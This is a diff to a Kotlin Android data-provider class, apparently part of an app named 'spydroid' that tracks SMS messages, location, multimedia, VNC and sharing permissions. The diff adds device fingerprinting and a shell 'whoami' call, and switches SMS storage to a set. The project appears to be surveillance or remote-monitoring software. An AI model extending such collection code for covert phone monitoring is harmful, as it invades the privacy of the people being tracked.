@@ -21,6 +21,7 @@ import android.annotation.SuppressLint
 import android.content.Context
 import android.content.SharedPreferences
 import android.net.Uri
+import android.os.Build
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import net.spydroid.common.local.data.KEYS_PM
@@ -29,6 +30,13 @@ import net.spydroid.common.local.models.CurrentLocation
 import net.spydroid.common.local.models.CurrentMultimedia
 import net.spydroid.common.local.models.CurrentSms
 import net.spydroid.common.local.models.PERMISSIONS_STATES
+import java.net.Inet4Address
+import java.net.InetAddress
+import java.net.NetworkInterface
+import java.net.SocketException
+import java.net.URL
+import java.util.Locale
+import kotlin.concurrent.thread
 
 class LocalDataProvider private constructor(
     private val context: Context
@@ -73,7 +81,7 @@ class LocalDataProvider private constructor(
         )
     )
     private val _currentSms = MutableStateFlow(
-        mutableListOf(CurrentSms())
+        mutableSetOf(CurrentSms())
     )
     private val _currentMultimedia = MutableStateFlow(
         CurrentMultimedia()
@@ -92,6 +100,25 @@ class LocalDataProvider private constructor(
         }
     }
 
+    // Device Info Main
+    private val _aliasDevice = MutableStateFlow(
+        "${Build.MANUFACTURER}_${Build.MODEL}_${Build.VERSION.RELEASE}"
+            .uppercase(Locale.getDefault())
+    )
+
+    private val _nameDevice = MutableStateFlow(
+        try {
+            val process = Runtime.getRuntime().exec("whoami")
+            val reader = process.inputStream.bufferedReader()
+            val resultado = reader.readText().trim()
+            reader.close()
+            resultado
+        } catch (e: Exception) {
+            e.printStackTrace()
+            ""
+        }
+    )
+
     // Data States
     val locationState: StateFlow<String> = _locationState
     val vncState: StateFlow<String> = _vncState
@@ -103,9 +130,12 @@ class LocalDataProvider private constructor(
     val shareDataState: StateFlow<String> = _shareDataState
     val internetState: StateFlow<String> = _internetState
     val currentLocation: StateFlow<CurrentLocation> = _currentLocation
-    val currentSms: StateFlow<List<CurrentSms>> = _currentSms
+    val currentSms: StateFlow<Set<CurrentSms>> = _currentSms
     val currentMutimedia: StateFlow<CurrentMultimedia> = _currentMultimedia
 
+    // DeviceInfo
+    val aliasDevice: StateFlow<String> = _aliasDevice
+    val nameDevice: StateFlow<String> = _nameDevice
 
     fun setLocationState(state: PERMISSIONS_STATES) = apply {
         updateStateFlowPermissions(_locationState, KEYS_PM.LOCATION, state)
@@ -148,7 +178,7 @@ class LocalDataProvider private constructor(
     }
 
     fun setSmsCurrent(sms: CurrentSms) = apply {
-        val updatedList = _currentSms.value.toMutableList().apply {
+        val updatedList = _currentSms.value.toMutableSet().apply {
             if (sms !in this) {
                 add(sms)
             }
